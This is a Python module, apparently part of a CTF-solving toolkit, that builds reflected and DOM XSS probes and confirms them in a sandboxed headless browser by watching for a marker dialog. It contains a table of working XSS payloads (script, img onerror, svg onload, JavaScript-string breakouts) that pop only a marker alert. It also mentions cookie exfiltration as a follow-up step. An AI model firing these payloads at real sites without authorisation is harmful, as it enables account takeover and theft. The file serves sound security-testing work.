#!/usr/bin/env python3
"""solvers/web/browser_xss.py -- B-122 browser-executed reflected/DOM XSS confirmation engine.

Stored-XSS-to-moderator-receipt is already a cold Layer-1 move, but *reflected* and *DOM* XSS that
only prove themselves when a real browser runs the target's own JavaScript were agent/browser-only
every time: Layer 1 deliberately never executes target-authored code.  This engine is the
explicitly-invoked, sandboxed helper that closes that class.  It:

  * builds **inert, marker-carrying** XSS probes -- either an *advertised reflection* (a payload in a
    URL parameter or fragment) or a probe derived from a *traced source-to-sink DOM flow* (the
    offline tracer ``solvers/web/client_side_depth.analyze_dom_flows`` finds the flow; this engine
    turns it into a URL the sink can be reached through);
  * drives B-150's pinned, sandboxed browser worker (``ctf.web_browser``) to load each probe and
    **observe whether the dialog oracle fired**, matching the dialog text against *this probe's own
    random marker* so an unrelated ``alert`` on the page is never mistaken for our payload executing;
  * surfaces the proof (the firing URL and the observation), and, if an observation happens to carry
    a value in the event flag format, returns it as a solved flag.

Policy boundaries (never relaxed):

  * **Not a default Layer-1 engine.**  Executing target-authored code in a browser is outside cold
    Layer 1 by policy, so this engine carries no ``[intake]`` table (the no-model intake pass never
    runs it) and needs the browser harness, which is absent by default: an operator/agent invokes it
    explicitly (``python -m ctf run web.browser_xss <dir> --opt target=... ``).  Triage may *suggest*
    it for a browser-XSS web row, but suggesting is not running.
  * **Sandboxed, loud absence.**  Every browser call goes through ``ctf.web_browser.BrowserWorker``,
    which launches the harness inside the network+process sandbox and runs ``ctf.scope.check_url``
    before any navigation.  When the browser binary is absent the engine returns ``blocked`` with a
    ``browser-harness`` reason (a ``needs_tool`` signal), never a silent fallback, and it never pulls
    or builds a Docker image.
  * **Inert payloads only.**  The payloads pop a dialog carrying a random marker and nothing else --
    no exfiltration, no network beacon.  Confirming that a dialog fired proves the vector executes;
    weaponizing it (cookie theft, a moderator bot) is a deliberate follow-up, not this engine's job.

The pure probe builders carry no I/O and are unit-tested offline; the confirmation path is tested
against a synthetic worker that returns ``ctf.web_browser`` result records, so the suite never starts
a real browser and never leaves loopback.  Entry: ``solve(challenge_dir, profile, **opts)`` (CONTRACTS
6-7).
"""
from __future__ import annotations

import dataclasses
import functools
import html.parser
import re
import secrets
import urllib.parse
from pathlib import Path
from typing import Any, Callable, Mapping, Sequence

# Marker prefix for the dialog oracle.  The confirmed proof is a dialog whose text carries THIS
# probe's unique marker; a bare alphanumeric marker is safe inside the payloads' single quotes.
MARKER_PREFIX = "XSSPROOF"
MAX_PROBES = 64
MAX_SOURCE_BYTES = 2 * 1024 * 1024
MAX_MINED_PARAMS = 16
PLACEMENTS: tuple[str, ...] = ("query", "fragment")
# The B-150 sandbox modes this engine accepts when it builds its own worker.  B-150 also allows
# "none" (for its suite harness); executing target-authored JavaScript unsandboxed is refused here.
SANDBOXED_MODES: tuple[str, ...] = ("seatbelt", "docker")

# The fixed worker script this engine uses: navigate and report whether a dialog fired (B-150's
# closed FIXED_SCRIPTS registry).  The caller never hands the worker a payload of its own -- the
# payload rides in the probe URL and the *target* reflects/executes it; the worker only observes.
ORACLE_SCRIPT = "observe_xss_oracle"
# Observation kinds we ask the worker for (all from B-150's closed OBSERVATION_KINDS set).
OBSERVE_KINDS = ("dialog", "console", "page_error", "navigation")

# Parameters commonly reflected on CTF web apps, used when the caller names none.
DEFAULT_PARAMS: tuple[str, ...] = (
    "q", "s", "search", "query", "name", "input", "msg", "message", "text", "redirect",
)

# The inert payload templates, keyed by injection context.  ``{m}`` is replaced by the probe marker.
# Each payload, when reflected in that context, calls ``alert('<marker>')`` and nothing else.
_PAYLOADS: Mapping[str, tuple[str, ...]] = {
    "html_body": (
        "<script>alert('{m}')</script>",
        "<img src=x onerror=alert('{m}')>",
        "<svg onload=alert('{m}')>",
    ),
    "html_attr_double": (
        "\"><img src=x onerror=alert('{m}')>",
        "\"><svg onload=alert('{m}')>",
    ),
    "html_attr_single": (
        "'><img src=x onerror=alert('{m}')>",
    ),
    "js_string_double": (
        "\";alert('{m}');//",
        "\"-alert('{m}')-\"",
    ),
    "js_string_single": (
        "';alert('{m}');//",
        "'-alert('{m}')-'",
    ),
    "uri": (
        "javascript:alert('{m}')",
    ),
    "dom_html": (
        "<img src=x onerror=alert('{m}')>",
        "<svg onload=alert('{m}')>",
    ),
    "dom_script": (
        "alert('{m}')",
        "';alert('{m}');//",
    ),
}

CONTEXTS: tuple[str, ...] = tuple(_PAYLOADS)
# The contexts an *advertised reflection* probe sweeps when the caller names none: a reflection most
# often lands in the HTML body or an HTML attribute.
DEFAULT_REFLECTION_CONTEXTS: tuple[str, ...] = ("html_body", "html_attr_double", "html_attr_single")

# A traced DOM flow's sink context -> the payload context to fire into it.
_SINK_CONTEXT_TO_PAYLOAD: Mapping[str, str] = {"html": "dom_html", "script": "dom_script", "url": "uri"}
# A traced DOM flow's *source* -> where in the URL the attacker controls it.
_SOURCE_TO_PLACEMENT: Mapping[str, str] = {
    "location_search": "query",
    "url_search_params": "query",
    "document_url": "query",
    "location_hash": "fragment",
}


class BrowserXssError(ValueError):
    """A malformed target URL, context, placement, or supplied artifact."""


# --------------------------------------------------------------------------------------------------
#  probe records
# --------------------------------------------------------------------------------------------------
@dataclasses.dataclass(frozen=True)
class XssProbe:
    """One inert, marker-carrying probe: a URL to load and the marker whose dialog proves execution."""

    url: str
    marker: str
    context: str
    placement: str            # "query" | "fragment"
    param: str | None
    origin: str               # "reflection" | "dom_flow"
    payload: str
    note: str = ""

    def to_dict(self) -> dict[str, Any]:
        d = dataclasses.asdict(self)
        d.update({"inert": True, "oracle": "dialog"})
        return d


@dataclasses.dataclass(frozen=True)
class ProbeResult:
    """What the browser did with one probe."""

    probe: XssProbe
    executed: bool            # a dialog carrying this probe's marker fired
    reason: str
    kinds: tuple[str, ...] = ()    # observation kinds the worker reported
    flags: tuple[str, ...] = ()    # event-format flags seen in any observation text
    ok: bool = True           # the evaluation itself ran (False = worker/scope error, see reason)

    def to_dict(self) -> dict[str, Any]:
        return {"probe": self.probe.to_dict(), "executed": self.executed, "reason": self.reason,
                "kinds": list(self.kinds), "flags": list(self.flags), "ok": self.ok}


# --------------------------------------------------------------------------------------------------
#  pure probe builders (no browser, no I/O)
# --------------------------------------------------------------------------------------------------
def make_marker() -> str:
    """A fresh unguessable marker that ties a confirmed dialog to exactly one probe."""
    return f"{MARKER_PREFIX}{secrets.token_hex(6)}"


def payloads_for(context: str) -> tuple[str, ...]:
    """The inert payload templates for ``context`` (``{m}`` still a placeholder)."""
    if context not in _PAYLOADS:
        raise BrowserXssError(f"unknown injection context {context!r}; choose from {', '.join(CONTEXTS)}")
    return _PAYLOADS[context]


def build_probe_url(base_url: str, payload: str, *, param: str | None = None,
                    placement: str = "query") -> str:
    """Place ``payload`` into ``base_url`` at ``param`` (query) or in the fragment, URL-encoded.

    ``query`` replaces/sets ``param`` in the query string; ``fragment`` sets the fragment to
    ``param=payload`` (or the raw payload when ``param`` is ``None``).  The target base must be
    http/https; a mailto/javascript/file base is refused here (and scope is enforced later by the
    worker).
    """
    try:
        parts = urllib.parse.urlsplit(base_url)
    except ValueError as exc:
        raise BrowserXssError(f"not a URL: {base_url!r}") from exc
    if parts.scheme not in ("http", "https") or not parts.netloc:
        raise BrowserXssError(f"target must be an http(s) URL with a host; got {base_url!r}")
    if placement == "query":
        if not param:
            raise BrowserXssError("query placement needs a param name")
        pairs = [(k, v) for k, v in urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
                 if k != param]
        pairs.append((param, payload))
        new = parts._replace(query=urllib.parse.urlencode(pairs))
    elif placement == "fragment":
        value = urllib.parse.quote(payload, safe="")
        frag = f"{param}={value}" if param else value
        new = parts._replace(fragment=frag)
    else:
        raise BrowserXssError(f"placement must be 'query' or 'fragment'; got {placement!r}")
    return urllib.parse.urlunsplit(new)


def _marker_for(factory: Callable[[], str] | None) -> str:
    return (factory or make_marker)()


def reflection_probes(base_url: str, *, params: Sequence[str] = (),
                      contexts: Sequence[str] = DEFAULT_REFLECTION_CONTEXTS,
                      placement: str = "query",
                      marker_factory: Callable[[], str] | None = None,
                      limit: int = MAX_PROBES) -> tuple[XssProbe, ...]:
    """Advertised-reflection probes: for each param and each context, one marked payload in the URL.

    This is the "loads an inert advertised reflection" path: we do not yet know the page reflects the
    parameter; the browser confirms it by firing (or not).  ``placement`` puts the payload in the
    query string (``?param=``) or in the fragment (``#param=``).
    """
    if placement not in PLACEMENTS:
        raise BrowserXssError(f"placement must be one of {', '.join(PLACEMENTS)}; got {placement!r}")
    use_params = tuple(dict.fromkeys(params)) or DEFAULT_PARAMS
    sep = "?" if placement == "query" else "#"
    out: list[XssProbe] = []
    for param in use_params:
        for context in contexts:
            for template in payloads_for(context):
                marker = _marker_for(marker_factory)
                payload = template.format(m=marker)
                url = build_probe_url(base_url, payload, param=param, placement=placement)
                out.append(XssProbe(url=url, marker=marker, context=context, placement=placement,
                                    param=param, origin="reflection", payload=payload,
                                    note=f"reflected into {context} via {sep}{param}="))
                if len(out) >= limit:
                    return tuple(out)
    return tuple(out)


def dom_flow_probes(base_url: str, flows: Sequence[Any], *, params: Sequence[str] = (),
                    marker_factory: Callable[[], str] | None = None,
                    limit: int = MAX_PROBES) -> tuple[XssProbe, ...]:
    """Probes derived from traced source-to-sink DOM flows.

    ``flows`` are ``client_side_depth.DOMFlow`` objects (or their ``to_dict`` mappings).  For each
    flow whose *source* is URL-controllable (``location.search``/``.hash``/``URLSearchParams``/
    ``document.URL``) we fire the payload for its *sink context* through the matching URL placement.
    A flow already marked ``mitigated`` is skipped (a sanitizer covers the sink context).
    """
    use_params = tuple(dict.fromkeys(params)) or DEFAULT_PARAMS
    out: list[XssProbe] = []
    for flow in flows:
        source = _flow_attr(flow, "source")
        sink_context = _flow_attr(flow, "sink_context")
        mitigated = _flow_attr(flow, "mitigated")
        placement = _SOURCE_TO_PLACEMENT.get(str(source))
        payload_ctx = _SINK_CONTEXT_TO_PAYLOAD.get(str(sink_context))
        if placement is None or payload_ctx is None or mitigated:
            continue
        templates = payloads_for(payload_ctx)
        targets: tuple[tuple[str | None, str], ...]
        if placement == "fragment":
            # The hash sink is usually read raw; try a bare fragment and each named param form.
            targets = ((None, "fragment"),) + tuple((p, "fragment") for p in use_params)
        else:
            targets = tuple((p, "query") for p in use_params)
        for param, place in targets:
            for template in templates:
                marker = _marker_for(marker_factory)
                payload = template.format(m=marker)
                url = build_probe_url(base_url, payload, param=param, placement=place)
                out.append(XssProbe(url=url, marker=marker, context=payload_ctx, placement=place,
                                    param=param, origin="dom_flow", payload=payload,
                                    note=f"{source} -> {sink_context} sink"))
                if len(out) >= limit:
                    return tuple(out)
    return tuple(out)


def _flow_attr(flow: Any, name: str) -> Any:
    if isinstance(flow, Mapping):
        return flow.get(name)
    return getattr(flow, name, None)


def probes_from_source(base_url: str, source: str | bytes, *, params: Sequence[str] = (),
                       marker_factory: Callable[[], str] | None = None,
                       limit: int = MAX_PROBES) -> tuple[XssProbe, ...]:
    """Run the offline DOM-flow tracer on saved page JavaScript, then build dom-flow probes from it.

    Builds on ``solvers/web/client_side_depth.analyze_dom_flows`` -- the browser-executed extension of
    that offline tracer.
    """
    from solvers.web import client_side_depth as _csd  # package import; no side effects
    flows = _csd.analyze_dom_flows(source)
    return dom_flow_probes(base_url, flows, params=params, marker_factory=marker_factory, limit=limit)


# --------------------------------------------------------------------------------------------------
#  candidate parameters from a saved page (offline; replaces guessing DEFAULT_PARAMS)
# --------------------------------------------------------------------------------------------------
_PARAM_NAME = re.compile(r"^[A-Za-z0-9_.\-\[\]]{1,64}$")
# A literal parameter name page JavaScript reads from the URL: ``searchParams.get('q')`` /
# ``new URLSearchParams(location.search).get("q")`` / ``params.get('q')`` (only when the script uses
# URLSearchParams or searchParams at all, so an unrelated Map.get('k') is not taken as a param).
_JS_GET = re.compile(r"\.get\(\s*(['\"])([A-Za-z0-9_.\-]{1,64})\1\s*\)")


class _PageParams(html.parser.HTMLParser):
    """Form field names, query keys of links/forms and inline script text from a saved page."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.names: list[str] = []
        self.scripts: list[str] = []
        self._script: list[str] | None = None

    def handle_starttag(self, tag, attrs):
        a = {str(k).lower(): ("" if v is None else str(v)) for k, v in attrs[:64]}
        low = tag.lower()
        if low in ("input", "textarea", "select", "button") and a.get("name"):
            self.names.append(a["name"])
        for attr in ("href", "action", "src", "formaction"):
            if a.get(attr):
                try:
                    query = urllib.parse.urlsplit(a[attr]).query
                except ValueError:
                    continue
                self.names.extend(k for k, _ in urllib.parse.parse_qsl(query, keep_blank_values=True))
        if low == "script":
            self._script = None if a.get("src") else []

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)

    def handle_endtag(self, tag):
        if tag.lower() == "script" and self._script is not None:
            self.scripts.append("".join(self._script))
            self._script = None

    def handle_data(self, data):
        if self._script is not None:
            self._script.append(data)


def _response_body(raw: str) -> str:
    """A saved HTTP response's body (status line and headers dropped); a bare page is returned as is."""
    if raw.startswith("HTTP/"):
        for sep in ("\r\n\r\n", "\n\n"):
            _head, found, body = raw.partition(sep)
            if found:
                return body
        return ""
    return raw


def page_inventory(page: str | bytes) -> tuple[tuple[str, ...], str]:
    """``(candidate params, inline JavaScript)`` from a saved HTML page or raw HTTP response.

    Candidate params are the page's form field names, the query keys of its links and form actions,
    and the literal names its scripts read with ``URLSearchParams``/``searchParams.get('...')``: the
    parameters the page actually takes, so the reflection sweep need not guess ``DEFAULT_PARAMS``.
    The inline JavaScript goes to the DOM-flow tracer.  Offline: nothing is fetched or run.
    """
    text = page.decode("utf-8", "replace") if isinstance(page, (bytes, bytearray)) else str(page)
    parser = _PageParams()
    try:
        parser.feed(_response_body(text[:MAX_SOURCE_BYTES]))
        parser.close()
    except Exception:   # HTMLParser is forgiving; adversarial markup must never escape this reader
        pass
    js = "\n".join(parser.scripts)
    names = list(parser.names)
    if "URLSearchParams" in js or "searchParams" in js:
        names.extend(m.group(2) for m in _JS_GET.finditer(js))
    clean = [n for n in dict.fromkeys(n.strip() for n in names) if n and _PARAM_NAME.match(n)]
    return tuple(clean[:MAX_MINED_PARAMS]), js


# --------------------------------------------------------------------------------------------------
#  confirmation (drives the B-150 worker)
# --------------------------------------------------------------------------------------------------
def _observation_texts(evaluation: Any) -> list[str]:
    """Every human-readable string the worker reported, for a flag scan / evidence."""
    texts: list[str] = []
    for obs in getattr(evaluation, "observations", ()):  # ctf.web_browser.Observation
        detail = getattr(obs, "detail", {}) or {}
        for key in ("message", "text", "data_preview", "url", "text_preview"):
            val = detail.get(key)
            if isinstance(val, str) and val:
                texts.append(val)
    return texts


def confirm(worker: Any, probe: XssProbe, *, budget_ms: int | None = None,
            flag_scan: Callable[[str], Sequence[str]] | None = None) -> ProbeResult:
    """Load ``probe`` in the pinned browser and report whether its marker dialog fired.

    ``worker`` is a ``ctf.web_browser.BrowserWorker`` (or any object with the same ``evaluate``).
    Execution is proven only when a *dialog* observation's message is exactly this probe's marker --
    an unrelated page dialog, a dialog that merely echoes the probe URL, a console line, or no dialog
    at all is ``executed=False``.  When
    ``flag_scan`` is given, every observation string is scanned for event-format flags.
    """
    from ctf import web_browser as _wb, scope as _scope
    try:
        evaluation = worker.evaluate(probe.url, ORACLE_SCRIPT, observe=OBSERVE_KINDS,
                                     budget_ms=budget_ms)
    except _wb.BrowserUnavailable:
        raise                                 # a missing browser is loud; the caller turns it to blocked
    except (_scope.OutOfScope, OSError) as exc:
        # A scope refusal of this URL or a transport I/O error is a failed probe; the run continues.
        # Any other error (a ValueError for a script or observation kind B-150 does not know) is a
        # contract drift: it propagates loudly instead of masquerading as a "blocked" run.
        return ProbeResult(probe=probe, executed=False, ok=False,
                           reason=f"{type(exc).__name__}: {exc}")
    if not getattr(evaluation, "ok", False):
        return ProbeResult(probe=probe, executed=False, ok=False,
                           reason=getattr(evaluation, "reason", "") or "the browser evaluation failed")
    kinds = tuple(dict.fromkeys(o.kind for o in getattr(evaluation, "observations", ())))
    texts = _observation_texts(evaluation)
    flags: tuple[str, ...] = ()
    if flag_scan is not None:
        seen: list[str] = []
        for text in texts:
            for f in flag_scan(text) or ():
                if f and f not in seen:
                    seen.append(f)
        flags = tuple(seen)
    # The oracle: a dialog whose message IS this probe's marker.  Exact equality, not containment: a
    # page that safely echoes the URL in an alert (alert(location.href)) carries the marker as a
    # substring without our payload ever running.
    executed = False
    for obs in getattr(evaluation, "observations", ()):
        if obs.kind != "dialog":
            continue
        detail = getattr(obs, "detail", {}) or {}
        if any(str(detail.get(k, "")).strip() == probe.marker for k in ("message", "text")):
            executed = True
            break
    reason = (f"dialog fired marker {probe.marker}" if executed
              else "no dialog carried the probe marker")
    return ProbeResult(probe=probe, executed=executed, reason=reason, kinds=kinds, flags=flags)


def run_probes(worker: Any, probes: Sequence[XssProbe], *, stop_on_first: bool = True,
               budget_ms: int | None = None,
               flag_scan: Callable[[str], Sequence[str]] | None = None) -> tuple[ProbeResult, ...]:
    """Confirm each probe in turn; stop at the first confirmed execution when ``stop_on_first``.

    A ``BrowserUnavailable`` from the worker propagates (the whole run is blocked); a per-probe scope
    or evaluation error is recorded as a failed ``ProbeResult`` and the run continues.
    """
    out: list[ProbeResult] = []
    for probe in probes:
        result = confirm(worker, probe, budget_ms=budget_ms, flag_scan=flag_scan)
        out.append(result)
        if stop_on_first and (result.executed or result.flags):
            break
    return tuple(out)


# --------------------------------------------------------------------------------------------------
#  the engine entry (CONTRACTS 6-7) -- explicitly invoked, gated helper
# --------------------------------------------------------------------------------------------------
def make_worker(profile: Any, *, config: Any = None, transport_factory: Callable | None = None,
                clock: Callable[[], float] | None = None) -> Any:
    """B-150's pinned ``BrowserWorker`` whose scope check is bound to ``profile``.

    The worker's default scope check resolves the pinned / ``$CTF_EVENT`` profile, which need not be
    the event ``solve`` was handed (``ctf run ... --event X``); binding ``profile`` makes the scope
    check use the same event as the rest of the run.  ``config``/``transport_factory``/``clock`` are
    B-150's own seams, passed through unchanged.
    """
    import time as _time
    from ctf import scope as _scope, web_browser as _wb
    return _wb.BrowserWorker(config, transport_factory=transport_factory,
                             clock=clock or _time.monotonic,
                             scope_check=functools.partial(_scope.check_url, profile=profile))


_SOLVE_OPTS = ("target", "params", "placement", "contexts", "source", "page", "max_probes",
               "budget_ms", "stop_on_first", "worker")


def _read_under(challenge_dir, name: str, what: str) -> bytes:
    """``name`` read from inside ``challenge_dir`` (capped), or ``BrowserXssError`` naming why not."""
    base = Path(challenge_dir).resolve()
    path = (base / name).resolve()
    if base not in path.parents:
        raise BrowserXssError(f"{what} {name!r} is outside the challenge dir")
    if not path.is_file():
        raise BrowserXssError(f"{what} file {name!r} not found under the challenge dir")
    with path.open("rb") as fh:
        return fh.read(MAX_SOURCE_BYTES)


def _bounded_int(name: str, value: Any, low: int, high: int) -> int:
    if isinstance(value, bool) or not isinstance(value, int) or not (low <= value <= high):
        raise BrowserXssError(f"{name}={value!r} must be an integer in {low}..{high}")
    return value


def solve(challenge_dir, profile, *, target: str | None = None, params=None,
          placement: str | None = None, contexts=None, source: str | None = None,
          page: str | None = None, max_probes: int = MAX_PROBES, budget_ms: int | None = None,
          stop_on_first: bool = True, worker: Any = None, **unknown_opts):
    """Confirm reflected/DOM XSS in a real sandboxed browser against ``target``.

    ``target`` is the one assigned web URL (required; this is an explicitly-invoked helper).  ``params``
    (comma/space list) names reflected parameters to probe; ``placement`` (``query``, the default, or
    ``fragment``) is where the reflection sweep puts them; ``source`` names a saved page-JavaScript
    file under the challenge dir whose traced DOM flows become probes; ``page`` names a saved HTML
    page or raw HTTP response under the challenge dir whose form fields, link/form query keys and
    ``URLSearchParams`` reads become the candidate params (and whose inline scripts are traced for DOM
    flows).  DOM-flow probes go first -- they are targeted -- and the reflection sweep fills what is
    left of ``max_probes`` (1..MAX_PROBES).  ``worker`` injects a browser worker for tests; left out,
    B-150's ``BrowserWorker`` is built (scope bound to ``profile``) and the browser harness must be
    installed (else ``blocked`` with a ``browser-harness`` reason); that owned worker must run under a
    real sandbox (``CTF_BROWSER_SANDBOX`` in ``SANDBOXED_MODES``): ``none`` is ``blocked`` before any
    browser load.  An unknown option, or a ``worker`` that is not a worker object, is ``blocked``.

    Returns ``solved`` (a flag surfaced in an observation + evidence), ``unsure`` (a vector's dialog
    fired -- XSS confirmed, but no flag: weaponizing it is a follow-up), ``none`` (probed, nothing
    fired), or ``blocked`` (no target / bad option / no probes / no browser / out of scope).
    """
    from ctf.result import SolverResult, Evidence, Cost
    from ctf import flagfmt, web_browser
    import time as _time

    eid = "web.browser_xss"
    started = _time.monotonic()   # a live browser call is mostly wait; report wall-clock elapsed cost

    def _cost() -> Cost:
        return Cost(seconds=round(_time.monotonic() - started, 4))

    if unknown_opts:
        return SolverResult(status="blocked", engine=eid, cost=_cost(),
                            notes=f"unknown option(s) {sorted(unknown_opts)}; this engine takes "
                                  f"{', '.join(_SOLVE_OPTS)}")
    if not target:
        return SolverResult(status="blocked", engine=eid, cost=_cost(),
                            notes="no target: pass --opt target=http://host:port/path (the one "
                                  "assigned web target). This engine is an explicitly-invoked, "
                                  "sandboxed browser helper; it never runs in cold Layer 1.")

    # ``worker`` is a test seam: a real worker object.  The CLI JSON-decodes every --opt value, so a
    # CLI ``--opt worker=...`` arrives as a str/int/list -- never a worker -- and is refused here,
    # before it can crash at ``evaluate`` or bypass the engine's own sandboxed worker.
    if worker is not None and not callable(getattr(worker, "evaluate", None)):
        return SolverResult(status="blocked", engine=eid, cost=_cost(),
                            notes=f"worker={worker!r} is not a browser worker object (it has no "
                                  "evaluate); worker= is an in-process test seam and cannot be "
                                  "passed from the CLI")

    try:
        param_list = _split_opt("params", params)
        context_list = _split_opt("contexts", contexts) or DEFAULT_REFLECTION_CONTEXTS
    except BrowserXssError as exc:
        return SolverResult(status="blocked", engine=eid, cost=_cost(), notes=f"bad option: {exc}")
    bad_ctx = [c for c in context_list if c not in CONTEXTS]
    if bad_ctx:
        return SolverResult(status="blocked", engine=eid, cost=_cost(),
                            notes=f"unknown context(s) {bad_ctx}; choose from {', '.join(CONTEXTS)}")

    # ---- build the probe set (pure; no browser yet) ---------------------------------------------
    probes: list[XssProbe] = []
    mined: tuple[str, ...] = ()
    try:
        cap = _bounded_int("max_probes", max_probes, 1, MAX_PROBES)
        if budget_ms is not None:
            _bounded_int("budget_ms", budget_ms, 1, web_browser.MAX_BUDGET_MS)
        place = placement or "query"
        if place not in PLACEMENTS:
            raise BrowserXssError(f"placement must be one of {', '.join(PLACEMENTS)}; got {place!r}")
        scripts: list[bytes | str] = []
        if page:
            mined, page_js = page_inventory(_read_under(challenge_dir, page, "page"))
            if page_js:
                scripts.append(page_js)
        if source:
            scripts.append(_read_under(challenge_dir, source, "source"))
        use_params = tuple(dict.fromkeys(param_list + mined))
        # Traced DOM flows first: they are targeted, the reflection sweep is a guess.
        for js in scripts:
            if len(probes) >= cap:
                break
            probes.extend(probes_from_source(target, js, params=use_params,
                                             limit=cap - len(probes)))
        if len(probes) < cap:
            probes.extend(reflection_probes(target, params=use_params, contexts=context_list,
                                            placement=place, limit=cap - len(probes)))
    except BrowserXssError as exc:
        return SolverResult(status="blocked", engine=eid, cost=_cost(), notes=f"bad probe input: {exc}")

    probes = probes[:cap]
    if not probes:
        return SolverResult(status="blocked", engine=eid, cost=_cost(),
                            notes="no probes built: pass --opt params=q,s (reflected parameters) "
                                  "or --opt source=app.js (saved page JavaScript with a DOM flow).")

    # ---- resolve the browser (detection first, agents second) -----------------------------------
    if worker is None:
        try:
            config = web_browser.BrowserConfig.from_env()
        except web_browser.BrowserUnavailable as exc:
            return SolverResult(status="blocked", engine=eid, cost=_cost(),
                                notes=f"browser unavailable (needs_tool: browser-harness): {exc}")
        # Policy: target-authored JavaScript runs only inside the network+process sandbox.  B-150
        # allows CTF_BROWSER_SANDBOX=none (its suite harness uses it); this engine refuses it loudly.
        if config.sandbox_mode not in SANDBOXED_MODES:
            return SolverResult(status="blocked", engine=eid, cost=_cost(),
                                notes=f"refusing to run target-authored JavaScript with "
                                      f"CTF_BROWSER_SANDBOX={config.sandbox_mode!r}: this engine runs "
                                      f"only under a sandbox ({', '.join(SANDBOXED_MODES)}). "
                                      "Set CTF_BROWSER_SANDBOX=seatbelt or docker.")
        ok, detail = web_browser.availability(config)
        if not ok:
            return SolverResult(status="blocked", engine=eid, cost=_cost(),
                                notes=f"browser unavailable (needs_tool: browser-harness): {detail}. "
                                      "Install a sandboxed headless-browser harness "
                                      "(CTF_BROWSER_HARNESS) -- see docs/build-log/B-150.md.")
        try:
            owned_worker = make_worker(profile, config=config)
        except web_browser.BrowserUnavailable as exc:
            return SolverResult(status="blocked", engine=eid, cost=_cost(),
                                notes=f"browser unavailable (needs_tool: browser-harness): {exc}")
        close_worker = True
    else:
        owned_worker = worker
        close_worker = False

    ff = flagfmt.for_profile(profile)

    # ---- drive the browser ----------------------------------------------------------------------
    try:
        results = run_probes(owned_worker, probes, stop_on_first=stop_on_first, budget_ms=budget_ms,
                             flag_scan=ff.find_flags)
    except web_browser.BrowserUnavailable as exc:
        return SolverResult(status="blocked", engine=eid, cost=_cost(),
                            notes=f"browser unavailable (needs_tool: browser-harness): {exc}")
    finally:
        if close_worker:
            try:
                owned_worker.close()
            except Exception:
                pass

    # A hard scope refusal on the one target is a blocked result, not "found nothing".
    if results and all((not r.ok) for r in results):
        reasons = "; ".join(dict.fromkeys(r.reason for r in results))
        return SolverResult(status="blocked", engine=eid, cost=_cost(),
                            notes=f"no probe could be evaluated against {target}: {reasons}")

    # ---- report ---------------------------------------------------------------------------------
    flagged = [r for r in results if r.flags]
    if flagged:
        r = flagged[0]
        ev = [Evidence(kind="match", detail=f"flag surfaced in a browser observation on {r.probe.url}")]
        if r.executed:      # only claim the oracle when this probe's own marker dialog really fired
            ev.append(Evidence(kind="oracle", detail=f"probe {r.probe.context}/{r.probe.placement} "
                                                     f"fired the dialog oracle (marker {r.probe.marker})"))
        return SolverResult(status="solved", flags=tuple(r.flags), evidence=tuple(ev), engine=eid,
                            cost=_cost(), notes=f"flag read from the browser: {r.reason}")

    fired = [r for r in results if r.executed]
    if fired:
        r = fired[0]
        ev = (Evidence(kind="oracle",
                       detail=f"dialog oracle fired marker {r.probe.marker} on {r.probe.url} "
                              f"(context {r.probe.context}, {r.probe.origin})"),)
        return SolverResult(status="unsure", evidence=ev, engine=eid, cost=_cost(),
                            notes=f"confirmed browser XSS execution via {r.probe.origin} "
                                  f"({r.probe.note}); no flag -- weaponize (cookie exfil / moderator "
                                  f"bot) as a follow-up. {len(fired)} of {len(results)} probes fired.")

    return SolverResult(status="none", engine=eid, cost=_cost(),
                        notes=f"{len(results)} probe(s) loaded in the browser; none fired the dialog "
                              "oracle. Try other params/contexts or a DOM-flow source.")


def _split_opt(name: str, value) -> tuple[str, ...]:
    """A CLI opt -> a tuple of tokens.

    The CLI JSON-decodes every ``--opt`` value, so ``params=q,s`` arrives as a str, ``params=5`` as an
    int and ``params=["q",5]`` as a list.  A str is split on commas/whitespace; an int/float scalar
    (a numeric param name) or a list/tuple of str/int/float items is taken token by token.  Anything
    else (a bool, a dict, a nested list) is a ``BrowserXssError`` naming the option.
    """
    def _scalar(v) -> tuple[str, ...]:
        if isinstance(v, str):
            return tuple(t for t in v.replace(",", " ").split() if t)
        if isinstance(v, (int, float)) and not isinstance(v, bool):
            return (str(v),)
        raise BrowserXssError(f"{name}={value!r}: expected a comma/space list of names, "
                              f"not a {type(v).__name__}")

    if value is None:
        return ()
    if isinstance(value, (list, tuple)):
        return tuple(t for v in value for t in _scalar(v))
    return _scalar(value)


__all__ = [
    "MARKER_PREFIX", "MAX_PROBES", "ORACLE_SCRIPT", "OBSERVE_KINDS", "CONTEXTS",
    "DEFAULT_PARAMS", "DEFAULT_REFLECTION_CONTEXTS", "BrowserXssError", "XssProbe", "ProbeResult",
    "make_marker", "payloads_for", "build_probe_url", "reflection_probes", "dom_flow_probes",
    "probes_from_source", "page_inventory", "confirm", "run_probes", "make_worker", "solve",
    "PLACEMENTS", "SANDBOXED_MODES",
]


if __name__ == "__main__":  # pragma: no cover - thin CLI shim; real runs go through `python -m ctf run`
    import argparse
    import json as _json

    ap = argparse.ArgumentParser(description="Build inert browser-XSS probes (offline; no browser).")
    ap.add_argument("target")
    ap.add_argument("--param", action="append", default=[])
    ap.add_argument("--context", action="append", default=[])
    ap.add_argument("--limit", type=int, default=MAX_PROBES)
    args = ap.parse_args()
    built = reflection_probes(args.target, params=args.param,
                              contexts=args.context or DEFAULT_REFLECTION_CONTEXTS, limit=args.limit)
    print(_json.dumps([p.to_dict() for p in built], indent=2))
